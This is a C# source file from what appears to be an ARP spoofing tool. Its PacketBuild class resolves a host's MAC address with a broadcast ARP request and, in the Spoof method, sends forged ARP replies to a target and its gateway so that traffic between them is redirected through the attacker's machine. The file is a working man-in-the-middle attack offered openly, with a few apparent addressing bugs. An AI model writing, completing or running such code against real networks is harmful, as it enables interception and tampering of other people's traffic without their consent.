using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using PacketDotNet;
using SharpPcap;

namespace ArpSpoof.Core;

/// <summary>
/// Initializes a new instance of the <see cref="PacketBuild"/> class.
/// </summary>
public class PacketBuild
{
    /// <summary>
    /// Get mac address from ip address
    /// </summary>
    public static async Task<string> GetMacAddress(ILiveDevice device, string host, CancellationToken ct)
    {
        try
        {
            // Get local IP address
            var localIp = ((SharpPcap.LibPcap.LibPcapLiveDevice)device).Addresses
                            .FirstOrDefault(a =>
                                a.Addr.ipAddress != null &&
                                a.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
                            ?.Addr.ipAddress;

            if (localIp == null) throw new InvalidOperationException("[GetMacFromIP] Local IP address not found.");

            // Build ARP request packet
            var localMac = device.MacAddress;
            var targetIp = IPAddress.Parse(host);
            var arpPacket = new ArpPacket(
                            ArpOperation.Request,
                            PhysicalAddress.Parse("00-00-00-00-00-00"),
                            targetIp,
                            localMac,
                            localIp);

            // send broadcast ethernet frame
            var ethernetPacket = new EthernetPacket(
                localMac,
                PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                EthernetType.Arp);

            ethernetPacket.PayloadPacket = arpPacket;

            // this var will hold the result
            string macRes = null;

            // Task completion source to await the response
            var tcs = new TaskCompletionSource<string>();

            // here we handle the packet arrival event
            PacketArrivalEventHandler handler = (object s, PacketCapture e) =>
            {
                var rawPacket = e.GetPacket();
                var packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);
                var arp = packet.Extract<ArpPacket>();

                /*Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine($"DEBUG : {arp.SenderHardwareAddress} | {arp.SenderProtocolAddress}");
                Console.ResetColor();*/

                if (arp != null && arp.Operation == ArpOperation.Response && arp.SenderProtocolAddress.Equals(targetIp))
                {
                    tcs.TrySetResult(arp.SenderHardwareAddress.ToString());
                }
            };

            // bpf filter
            device.Filter = "arp";
            device.OnPacketArrival += handler;
            device.StartCapture();

            // wait a moment to ensure the capture is started
            await Task.Delay(500, ct);

            device.SendPacket(ethernetPacket);

            // Timeout cancellation
            using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            cts.CancelAfter(1000);

            // Await the task or timeout
            try
            {
                macRes = await tcs.Task.WaitAsync(cts.Token);
            }
            catch (OperationCanceledException)
            {
                macRes = null;
            }
            finally
            {
                //device.StopCapture(); // this cause issue on target mac discovery, i don't know why
                device.OnPacketArrival -= handler;
            }

            return macRes ?? throw new InvalidOperationException($"[GetMacFromIP] MAC address not found for the target IP {host} (HOST DOWN)");
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"[GetMacAddress] {ex.Message}");
        }
    }

    /// <summary>
    /// Send Spoofed Arp Packet
    /// </summary>
    public static void Spoof(ILiveDevice device, IPAddress targetIp, PhysicalAddress targetMac, IPAddress gatewayIp, PhysicalAddress gatewayMac)
    {
        try
        {
            // reply to the gateway
            var arpRequestToGateway = new ArpPacket(
                ArpOperation.Response,
                device.MacAddress,
                targetIp,
                gatewayMac,
                gatewayIp
            );

            // reply to the target
            var arpRequestToTarget = new ArpPacket(
                ArpOperation.Response,
                device.MacAddress,
                gatewayIp,
                targetMac,
                targetIp
            );

            // Sent to the gateway
            var ethToGateway = new EthernetPacket(device.MacAddress, targetMac, EthernetType.Arp);
            ethToGateway.PayloadPacket = arpRequestToGateway;
            device.SendPacket(ethToGateway);

            // Sent to the target
            var ethToTarget = new EthernetPacket(device.MacAddress, targetMac, EthernetType.Arp);
            ethToTarget.PayloadPacket = arpRequestToTarget;
            device.SendPacket(ethToTarget);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[{DateTime.Now}] Sent ARP reply to target: {targetIp} -> {DeviceHelper.FormattedMac(targetMac)}");
            Console.ResetColor();

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[{DateTime.Now}] * Spoofed * {gatewayIp} -> {DeviceHelper.FormattedMac(targetMac)}");
            Console.ResetColor();
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"[Spoof] {ex.Message}");
        }
    }
}
